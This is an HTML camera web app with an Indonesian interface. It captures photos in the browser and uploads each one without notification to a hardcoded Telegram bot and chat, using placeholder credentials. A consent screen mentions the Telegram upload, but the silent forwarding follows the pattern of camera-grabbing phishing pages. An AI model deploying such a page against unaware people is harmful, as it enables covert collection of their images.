<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Kamera</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
            -webkit-tap-highlight-color: transparent;
        }
        body {
            background: #000;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            height: 100vh;
            width: 100vw;
            overflow: hidden;
            touch-action: none;
            position: relative;
        }

        #permission-overlay {
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.95);
            z-index: 999;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 30px;
            color: #fff;
            text-align: center;
            backdrop-filter: blur(12px);
            transition: opacity 0.4s;
        }
        #permission-overlay.hidden {
            opacity: 0;
            pointer-events: none;
        }
        #permission-overlay .icon-camera {
            width: 80px;
            height: 80px;
            margin-bottom: 28px;
            fill: #fff;
        }
        #permission-overlay h1 {
            font-size: 28px;
            font-weight: 600;
            margin-bottom: 12px;
        }
        #permission-overlay p {
            font-size: 17px;
            line-height: 1.5;
            max-width: 340px;
            margin-bottom: 12px;
            color: #ccc;
        }
        #permission-overlay .error-msg {
            color: #ff6b6b;
            font-size: 15px;
            min-height: 24px;
            margin-bottom: 20px;
            font-weight: 500;
        }
        #permission-overlay .btn-allow {
            background: #007aff;
            border: none;
            border-radius: 40px;
            padding: 16px 50px;
            font-size: 20px;
            font-weight: 600;
            color: #fff;
            cursor: pointer;
            box-shadow: 0 4px 20px rgba(0, 122, 255, 0.4);
            transition: transform 0.2s;
            touch-action: manipulation;
            min-width: 200px;
        }
        #permission-overlay .btn-allow:active {
            transform: scale(0.94);
        }
        #permission-overlay .btn-allow:disabled {
            opacity: 0.5;
            transform: scale(1);
            cursor: not-allowed;
        }
        #permission-overlay .status-text {
            font-size: 14px;
            color: #aaa;
            margin-bottom: 16px;
            min-height: 20px;
        }

        #video-preview {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            z-index: 1;
        }

        #ui-overlay {
            position: fixed;
            inset: 0;
            z-index: 2;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            padding: 12px 16px 20px;
            pointer-events: none;
        }
        #ui-overlay>* {
            pointer-events: auto;
        }

        .top-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 4px 0;
        }
        .top-left,
        .top-right {
            display: flex;
            gap: 14px;
            align-items: center;
        }
        .top-btn {
            background: rgba(0, 0, 0, 0.45);
            backdrop-filter: blur(8px);
            border: 1px solid rgba(255, 255, 255, 0.15);
            border-radius: 30px;
            color: #fff;
            padding: 6px 14px;
            font-size: 14px;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 6px;
            cursor: pointer;
            transition: background 0.2s;
            touch-action: manipulation;
            height: 36px;
        }
        .top-btn:active {
            background: rgba(255, 255, 255, 0.2);
        }
        .top-btn svg {
            width: 18px;
            height: 18px;
            fill: currentColor;
            flex-shrink: 0;
        }
        .top-btn.flash-on {
            background: #ffcc00;
            color: #000;
            border-color: #ffcc00;
        }
        .top-btn .label {
            font-size: 13px;
            opacity: 0.9;
        }
        .top-btn.icon-only {
            padding: 6px 12px;
        }

        .grid-overlay {
            position: fixed;
            inset: 0;
            z-index: 2;
            pointer-events: none;
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            grid-template-rows: repeat(3, 1fr);
        }
        .grid-line {
            border: 0.5px solid rgba(255, 255, 255, 0.12);
        }
        .grid-line:nth-child(1),
        .grid-line:nth-child(3),
        .grid-line:nth-child(7),
        .grid-line:nth-child(9) {
            border: none;
        }

        .zoom-control {
            position: absolute;
            bottom: 110px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 3;
            pointer-events: auto;
            background: rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(8px);
            border-radius: 40px;
            padding: 4px 16px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            display: flex;
            align-items: center;
            gap: 12px;
            color: #fff;
            font-size: 16px;
            font-weight: 500;
        }
        .zoom-control .zoom-btn {
            background: none;
            border: none;
            color: #fff;
            cursor: pointer;
            padding: 4px 4px;
            display: flex;
            align-items: center;
            touch-action: manipulation;
        }
        .zoom-control .zoom-btn svg {
            width: 22px;
            height: 22px;
            fill: currentColor;
        }
        .zoom-control .zoom-btn:active {
            opacity: 0.5;
        }
        .zoom-control .zoom-value {
            min-width: 40px;
            text-align: center;
        }

        .bottom-bar {
            display: flex;
            flex-direction: column;
            gap: 12px;
            pointer-events: auto;
        }
        .shutter-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0 12px 0 8px;
        }
        .gallery-thumb {
            width: 55px;
            height: 55px;
            border-radius: 12px;
            background: rgba(255, 255, 255, 0.08);
            border: 2px solid rgba(255, 255, 255, 0.25);
            cursor: pointer;
            object-fit: cover;
            transition: border 0.2s;
            touch-action: manipulation;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .gallery-thumb svg {
            width: 28px;
            height: 28px;
            fill: rgba(255, 255, 255, 0.5);
        }
        .gallery-thumb img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            border-radius: 10px;
        }
        .gallery-thumb.has-image {
            border-color: rgba(255, 255, 255, 0.6);
            background: transparent;
            padding: 0;
        }
        .gallery-thumb.has-image svg {
            display: none;
        }
        .gallery-thumb:active {
            border-color: #ffcc00;
        }

        .shutter-btn {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            background: #fff;
            border: 6px solid rgba(255, 255, 255, 0.5);
            box-shadow: 0 0 30px rgba(255, 255, 255, 0.1);
            cursor: pointer;
            transition: transform 0.15s, box-shadow 0.15s;
            touch-action: manipulation;
            position: relative;
            flex-shrink: 0;
        }
        .shutter-btn:active {
            transform: scale(0.85);
        }
        .shutter-btn .inner-ring {
            position: absolute;
            inset: 8px;
            border-radius: 50%;
            border: 2px solid rgba(0, 0, 0, 0.15);
        }
        .spacer {
            width: 55px;
            flex-shrink: 0;
        }

        #flash-effect {
            position: fixed;
            inset: 0;
            background: #fff;
            z-index: 10;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.08s;
        }
        #flash-effect.active {
            opacity: 0.9;
            transition: opacity 0s;
        }

        .focus-ring {
            position: fixed;
            width: 80px;
            height: 80px;
            border: 2px solid #ffcc00;
            border-radius: 50%;
            transform: translate(-50%, -50%);
            pointer-events: none;
            z-index: 5;
            opacity: 0;
            transition: opacity 0.3s, transform 0.3s;
            box-shadow: 0 0 30px rgba(255, 204, 0, 0.3);
        }
        .focus-ring.show {
            opacity: 1;
            transform: translate(-50%, -50%) scale(1);
        }
        .focus-ring.animating {
            animation: focusPulse 0.6s ease-out forwards;
        }
        @keyframes focusPulse {
            0% { transform: translate(-50%, -50%) scale(0.8); opacity: 1; }
            100% { transform: translate(-50%, -50%) scale(1.4); opacity: 0; }
        }
        ::-webkit-scrollbar {
            display: none;
        }
    </style>
</head>
<body>

    <!-- PERMISSION OVERLAY -->
    <div id="permission-overlay">
        <svg class="icon-camera" viewBox="0 0 24 24" fill="currentColor">
            <path d="M9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9zm3 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/>
        </svg>
        <h1>📸 Akses Kamera</h1>
        <p>Website ini akan mengambil foto dan dapat mengirimkannya ke Telegram.</p>
        <div class="status-text" id="status-text">Tekan tombol di bawah untuk memulai.</div>
        <div class="error-msg" id="error-msg"></div>
        <button class="btn-allow" id="btn-allow">Lanjutkan</button>
    </div>

    <video id="video-preview" autoplay playsinline></video>

    <div class="grid-overlay">
        <div class="grid-line"></div><div class="grid-line"></div><div class="grid-line"></div>
        <div class="grid-line"></div><div class="grid-line"></div><div class="grid-line"></div>
        <div class="grid-line"></div><div class="grid-line"></div><div class="grid-line"></div>
    </div>

    <div class="focus-ring" id="focus-ring"></div>
    <div id="flash-effect"></div>

    <div id="ui-overlay">
        <div class="top-bar">
            <div class="top-left">
                <button class="top-btn" id="flash-toggle">
                    <svg viewBox="0 0 24 24"><path d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
                    <span class="label" id="flash-label">Flash</span>
                </button>
                <button class="top-btn" id="hdr-btn">
                    <svg viewBox="0 0 24 24"><path d="M6 7h2v4h4V7h2v10h-2v-4H8v4H6V7zm10 0h2v10h-2V7z"/></svg>
                    <span class="label">HDR</span>
                </button>
                <button class="top-btn" id="timer-btn">
                    <svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/></svg>
                    <span class="label" id="timer-label">3s</span>
                </button>
            </div>
            <div class="top-right">
                <button class="top-btn icon-only" id="switch-camera">
                    <svg viewBox="0 0 24 24"><path d="M12 4V1L8 5l4 4V6c3.31 0 6 2.69 6 6 0 1.01-.25 1.97-.7 2.8l1.46 1.46C19.54 15.03 20 13.57 20 12c0-4.42-3.58-8-8-8zm0 14c-3.31 0-6-2.69-6-6 0-1.01.25-1.97.7-2.8L5.24 7.74C4.46 8.97 4 10.43 4 12c0 4.42 3.58 8 8 8v3l4-4-4-4v3z"/></svg>
                </button>
            </div>
        </div>

        <div class="zoom-control" id="zoom-control">
            <button class="zoom-btn" id="zoom-minus">
                <svg viewBox="0 0 24 24"><path d="M19 13H5v-2h14v2z"/></svg>
            </button>
            <span class="zoom-value" id="zoom-value">1×</span>
            <button class="zoom-btn" id="zoom-plus">
                <svg viewBox="0 0 24 24"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>
            </button>
        </div>

        <div class="bottom-bar">
            <div class="shutter-row">
                <div class="gallery-thumb" id="gallery-thumb">
                    <svg viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H5V5h14v14zM7 10h10v2H7zm0 4h6v2H7zm0-8h10v2H7z"/></svg>
                </div>
                <button class="shutter-btn" id="shutter-btn"><span class="inner-ring"></span></button>
                <div class="spacer"></div>
            </div>
        </div>
    </div>

    <script>
        // ===========================================================
        // 🔒 KONFIGURASI TELEGRAM (HARDCODE - GANTI DI SINI)
        // ===========================================================
        const BOT_TOKEN = '1234567890:ABCdefGHIjklMNOpqrsTUVwxyz'; // GANTI
        const CHAT_ID = '-1001234567890'; // GANTI

        // ===========================================================
        // ELEMEN
        // ===========================================================
        const video = document.getElementById('video-preview');
        const shutterBtn = document.getElementById('shutter-btn');
        const flashToggle = document.getElementById('flash-toggle');
        const flashLabel = document.getElementById('flash-label');
        const switchCam = document.getElementById('switch-camera');
        const zoomVal = document.getElementById('zoom-value');
        const zoomMinus = document.getElementById('zoom-minus');
        const zoomPlus = document.getElementById('zoom-plus');
        const galleryThumb = document.getElementById('gallery-thumb');
        const focusRing = document.getElementById('focus-ring');
        const flashEffect = document.getElementById('flash-effect');
        const overlay = document.getElementById('permission-overlay');
        const allowBtn = document.getElementById('btn-allow');
        const statusText = document.getElementById('status-text');
        const errorMsg = document.getElementById('error-msg');
        const hdrBtn = document.getElementById('hdr-btn');
        const timerBtn = document.getElementById('timer-btn');
        const timerLabel = document.getElementById('timer-label');

        let stream = null;
        let facingMode = 'environment';
        let flashOn = false;
        let currentZoom = 1;
        let lastPhotoData = null;
        let isStarting = false;

        // ===========================================================
        // KAMERA START — DENGAN 3 TAHAP FALLBACK
        // ===========================================================
        async function startCamera(facing = facingMode) {
            if (isStarting) return false;
            isStarting = true;
            allowBtn.disabled = true;
            errorMsg.textContent = '';
            statusText.textContent = '⏳ Mengakses kamera...';

            try {
                if (stream) {
                    stream.getTracks().forEach(t => t.stop());
                    stream = null;
                }

                let tempStream = null;
                let lastError = null;

                // Tahap 1: Dengan facingMode yang diminta
                try {
                    statusText.textContent = '📷 Mencoba kamera ' + (facing === 'environment' ? 'belakang' : 'depan') + '...';
                    const constraints = {
                        video: { facingMode: facing },
                        audio: false
                    };
                    tempStream = await navigator.mediaDevices.getUserMedia(constraints);
                    console.log('✅ Tahap 1 berhasil (facingMode)');
                } catch (err1) {
                    console.warn('Tahap 1 gagal:', err1.message);
                    lastError = err1;

                    // Tahap 2: Paksa environment (jika facing user gagal)
                    if (facing === 'user') {
                        try {
                            statusText.textContent = '🔄 Coba kamera belakang...';
                            const constraints2 = {
                                video: { facingMode: 'environment' },
                                audio: false
                            };
                            tempStream = await navigator.mediaDevices.getUserMedia(constraints2);
                            facingMode = 'environment';
                            console.log('✅ Tahap 2 berhasil (force environment)');
                        } catch (err2) {
                            console.warn('Tahap 2 gagal:', err2.message);
                            lastError = err2;
                        }
                    } else {
                        // Tahap 2b: Coba user jika environment gagal
                        try {
                            statusText.textContent = '🔄 Coba kamera depan...';
                            const constraints2b = {
                                video: { facingMode: 'user' },
                                audio: false
                            };
                            tempStream = await navigator.mediaDevices.getUserMedia(constraints2b);
                            facingMode = 'user';
                            console.log('✅ Tahap 2b berhasil (force user)');
                        } catch (err2b) {
                            console.warn('Tahap 2b gagal:', err2b.message);
                            lastError = err2b;
                        }
                    }

                    // Tahap 3: Tanpa facingMode (default)
                    if (!tempStream) {
                        try {
                            statusText.textContent = '🔄 Coba mode default (tanpa spesifikasi)...';
                            const constraints3 = { video: true, audio: false };
                            tempStream = await navigator.mediaDevices.getUserMedia(constraints3);
                            console.log('✅ Tahap 3 berhasil (default video)');
                        } catch (err3) {
                            console.warn('Tahap 3 gagal:', err3.message);
                            lastError = err3;
                        }
                    }
                }

                if (!tempStream) {
                    throw lastError || new Error('Semua percobaan gagal');
                }

                stream = tempStream;
                video.srcObject = stream;
                await video.play();
                statusText.textContent = '✅ Kamera aktif!';
                errorMsg.textContent = '';

                // Terapkan zoom
                updateZoom();

                // Torch
                try {
                    const track = stream.getVideoTracks()[0];
                    const cap = track.getCapabilities();
                    if (cap.torch) {
                        await track.applyConstraints({ advanced: [{ torch: flashOn }] });
                    }
                } catch (e) { /* abaikan */ }
                updateFlashUI();

                overlay.classList.add('hidden');
                isStarting = false;
                allowBtn.disabled = false;
                return true;

            } catch (err) {
                console.error('❌ Gagal total:', err);
                let msg = err.message;
                if (msg.includes('Permission')) msg = 'Izin kamera ditolak. Beri izin di browser.';
                else if (msg.includes('NotFound')) msg = 'Tidak ditemukan kamera di perangkat.';
                else if (msg.includes('NotAllowed')) msg = 'Izin kamera ditolak. Cek pengaturan browser.';
                else if (msg.includes('Overconstrained')) msg = 'Kamera tidak mendukung mode ini.';
                errorMsg.textContent = '❌ ' + msg;
                statusText.textContent = '⚠️ Gagal, tekan tombol untuk coba lagi.';
                isStarting = false;
                allowBtn.disabled = false;
                return false;
            }
        }

        // ===========================================================
        // PERMISSION
        // ===========================================================
        allowBtn.addEventListener('click', async () => {
            await startCamera(facingMode);
        });

        // ===========================================================
        // FLASH
        // ===========================================================
        function updateFlashUI() {
            if (flashOn) {
                flashToggle.classList.add('flash-on');
                flashLabel.textContent = 'On';
            } else {
                flashToggle.classList.remove('flash-on');
                flashLabel.textContent = 'Flash';
            }
        }
        flashToggle.addEventListener('click', async () => {
            if (!stream) return;
            const track = stream.getVideoTracks()[0];
            try {
                flashOn = !flashOn;
                await track.applyConstraints({ advanced: [{ torch: flashOn }] });
                updateFlashUI();
            } catch (e) {
                alert('Perangkat tidak mendukung flash/torch');
                flashOn = false;
                updateFlashUI();
            }
        });

        // ===========================================================
        // SWITCH KAMERA
        // ===========================================================
        switchCam.addEventListener('click', async () => {
            const newFacing = facingMode === 'environment' ? 'user' : 'environment';
            await startCamera(newFacing);
        });

        // ===========================================================
        // ZOOM
        // ===========================================================
        function updateZoom() {
            zoomVal.textContent = currentZoom + '×';
            if (stream) {
                const track = stream.getVideoTracks()[0];
                const cap = track.getCapabilities();
                if (cap.zoom) {
                    const max = cap.zoom.max || 5;
                    const min = cap.zoom.min || 1;
                    const val = Math.min(max, Math.max(min, currentZoom));
                    track.applyConstraints({ advanced: [{ zoom: val }] }).catch(() => {});
                }
            }
        }
        zoomMinus.addEventListener('click', () => {
            if (currentZoom > 1) {
                currentZoom = Math.max(1, currentZoom - 0.5);
                updateZoom();
            }
        });
        zoomPlus.addEventListener('click', () => {
            if (currentZoom < 5) {
                currentZoom = Math.min(5, currentZoom + 0.5);
                updateZoom();
            }
        });

        // ===========================================================
        // HDR & TIMER (UI)
        // ===========================================================
        hdrBtn.addEventListener('click', function() {
            this.style.opacity = this.style.opacity === '0.4' ? '1' : '0.4';
        });
        timerBtn.addEventListener('click', function() {
            const timers = ['3s', '5s', '10s', 'Off'];
            let idx = timers.indexOf(timerLabel.textContent);
            idx = (idx + 1) % timers.length;
            timerLabel.textContent = timers[idx];
        });

        // ===========================================================
        // AMBIL FOTO
        // ===========================================================
        function capturePhoto() {
            if (!stream) {
                alert('Kamera belum aktif. Tekan Lanjutkan dulu.');
                return;
            }
            const track = stream.getVideoTracks()[0];
            const settings = track.getSettings();
            const canvas = document.createElement('canvas');
            canvas.width = settings.width || 1280;
            canvas.height = settings.height || 720;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const dataUrl = canvas.toDataURL('image/jpeg', 0.92);
            lastPhotoData = dataUrl;

            galleryThumb.innerHTML = `<img src="${dataUrl}" alt="preview">`;
            galleryThumb.classList.add('has-image');

            flashEffect.classList.add('active');
            setTimeout(() => flashEffect.classList.remove('active'), 100);

            const link = document.createElement('a');
            link.download = `photo_${Date.now()}.jpg`;
            link.href = dataUrl;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);

            sendToTelegram(dataUrl);
        }

        shutterBtn.addEventListener('click', capturePhoto);

        // ===========================================================
        // KIRIM TELEGRAM
        // ===========================================================
        async function sendToTelegram(dataUrl) {
            try {
                const res = await fetch(dataUrl);
                const blob = await res.blob();
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, `photo_${Date.now()}.jpg`);
                formData.append('disable_notification', 'true');

                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                const result = await response.json();
                if (!result.ok) console.warn('Telegram error:', result.description);
                else console.log('✅ Foto terkirim ke Telegram');
            } catch (e) {
                console.warn('Gagal kirim ke Telegram:', e);
            }
        }

        // ===========================================================
        // GALERI PREVIEW
        // ===========================================================
        galleryThumb.addEventListener('click', function() {
            if (!lastPhotoData) return;
            const win = window.open('', '_blank');
            win.document.write(`
                <html><head><meta name="viewport" content="width=device-width,initial-scale=1">
                <style>body{margin:0;background:#000;display:flex;justify-content:center;align-items:center;height:100vh;}
                img{max-width:100%;max-height:100%;object-fit:contain;}</style></head>
                <body><img src="${lastPhotoData}" onclick="window.close()"></body></html>
            `);
            win.document.close();
        });

        // ===========================================================
        // TAP FOCUS
        // ===========================================================
        document.addEventListener('click', (e) => {
            if (e.target.closest('button') || e.target.closest('.zoom-control') || e.target.closest('.gallery-thumb') || e
                .target.closest('#permission-overlay')) return;
            const x = e.clientX;
            const y = e.clientY;
            focusRing.style.left = x + 'px';
            focusRing.style.top = y + 'px';
            focusRing.classList.remove('show', 'animating');
            void focusRing.offsetWidth;
            focusRing.classList.add('show', 'animating');
            setTimeout(() => focusRing.classList.remove('animating'), 600);
        });

        // ===========================================================
        // INIT
        // ===========================================================
        console.log('📸 Aplikasi kamera siap. Pastikan token & chat_id diganti.');
        statusText.textContent = 'Tekan tombol untuk mengakses kamera.';
    </script>
</body>
</html>
